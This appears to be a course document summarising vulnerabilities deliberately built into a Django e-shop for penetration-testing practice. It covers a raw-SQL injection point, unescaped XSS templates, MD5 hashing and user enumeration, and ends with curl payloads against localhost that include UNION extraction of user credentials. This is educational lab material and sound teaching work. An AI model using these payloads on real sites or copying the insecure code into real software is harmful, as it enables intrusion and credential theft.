# Vulnerability Summary - E-Shop Application

## Executive Summary

This document provides a comprehensive overview of all intentionally introduced vulnerabilities in the e-shop application for educational penetration testing purposes. The application contains critical security flaws across multiple categories as required by the CDS201 course assignment.

## Implemented Vulnerabilities

### 1. SQL Injection (SQLi)
- **Type**: Classic SQL Injection
- **Location**: Product search functionality (`/catalog/?q=`)
- **File**: `eshop/views.py` (lines 366-371)
- **Severity**: Critical
- **OWASP**: A03:2021 – Injection

**Key Implementation**:
```python
raw_query = f"""
SELECT * FROM eshop_product 
WHERE name LIKE '%%{search_query}%%'
"""
```

### 2. Cross-Site Scripting (XSS)
- **Type**: Both Reflected and Stored XSS
- **Locations**: 
  - Search results display (Reflected)
  - Product reviews (Stored)
  - Shipping address forms (Stored)
- **Files**: Multiple template and form files
- **Severity**: High
- **OWASP**: A03:2021 – Injection

**Key Implementations**:
- Disabled `bleach` sanitization
- Used `|safe` filter in templates
- `{% autoescape off %}` blocks

### 3. Authentication Weaknesses
- **Types**: Multiple authentication vulnerabilities
- **Issues**:
  - User enumeration via different error messages
  - No rate limiting (brute force possible)
  - Weak password hashing (MD5)
  - No CAPTCHA protection
  - Insecure session cookies
- **Files**: `forms.py`, `settings.py`, `middleware.py`
- **Severity**: Critical
- **OWASP**: A07:2021 – Identification and Authentication Failures

**Key Implementations**:
- Different error messages for invalid username vs password
- Disabled middleware for rate limiting
- Changed from Argon2 to MD5 hashing
- `SESSION_COOKIE_HTTPONLY = False`

### 4. Security Misconfigurations
- **Issues**:
  - `DEBUG = True` in production
  - Disabled security headers middleware
  - Removed 2FA/OTP protection
  - Weak session security
- **Files**: `settings.py`
- **Severity**: High
- **OWASP**: A05:2021 – Security Misconfiguration

### 5. Information Disclosure
- **Issues**:
  - Detailed error messages in SQL injection
  - Debug mode exposes system information
  - Stack traces visible to users
- **Files**: `views.py`, `settings.py`
- **Severity**: Medium
- **OWASP**: A01:2021 – Broken Access Control

## Quick Exploitation Guide

### SQL Injection
```bash
# Basic test
curl "http://localhost:8000/catalog/?q=' OR '1'='1"

# Extract data
curl "http://localhost:8000/catalog/?q=' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--"
```

### XSS
```bash
# Reflected XSS
curl "http://localhost:8000/catalog/?q=<script>alert('XSS')</script>"

# Stored XSS (requires login)
# Submit review with: <script>alert('Stored XSS')</script>
```

### Authentication Attacks
```bash
# User enumeration
curl -X POST http://localhost:8000/login/ -d "username=admin&password=wrong"
# Returns: "Invalid password for user 'admin'"

curl -X POST http://localhost:8000/login/ -d "username=notexist&password=wrong"
# Returns: "Username 'notexist' does not exist in our system"
```

## Modified Files Summary

1. **eshop/views.py**
   - Added raw SQL queries (SQL injection)
   - Removed bleach import
   - Added vulnerable review functionality

2. **eshop/forms.py**
   - Removed input sanitization
   - Added user enumeration in login
   - Disabled CAPTCHA
   - Added vulnerable review form

3. **eshop/models/reviews.py** (NEW)
   - Created vulnerable review model
   - No input validation

4. **eshop/templates/eshop/catalog.html**
   - Added `|safe` filter for XSS

5. **eshop/templates/eshop/product_detail.html** (NEW)
   - Created with `{% autoescape off %}`
   - Displays unescaped reviews

6. **eshop_project/settings.py**
   - Changed to MD5 password hashing
   - Disabled security middleware
   - Weakened session security
   - `DEBUG = True`

7. **eshop/urls.py**
   - Added product detail and review URLs

## Testing Tools Recommended

1. **SQL Injection**: SQLMap, Burp Suite
2. **XSS**: XSStrike, BeEF, Manual payloads
3. **Authentication**: Hydra, Burp Intruder, Custom scripts
4. **General**: OWASP ZAP, Nikto, Nmap

## Important Notes

⚠️ **WARNING**: This application is intentionally vulnerable for educational purposes only. 

- **DO NOT** deploy to production
- **DO NOT** expose to the internet
- Use only in isolated, controlled environments
- All vulnerabilities are documented for learning purposes

## Next Steps for Penetration Testing

1. **Reconnaissance**: Map application structure
2. **Scanning**: Identify all endpoints
3. **Enumeration**: Find valid users and data
4. **Exploitation**: Test each vulnerability
5. **Documentation**: Create detailed penetration test report

## References

- [Assignment Requirements](../../../Εργασία_Ασφάλεια_Web_Apps.md)
- Individual vulnerability documentation in this folder
- OWASP Top 10 2021
- CWE database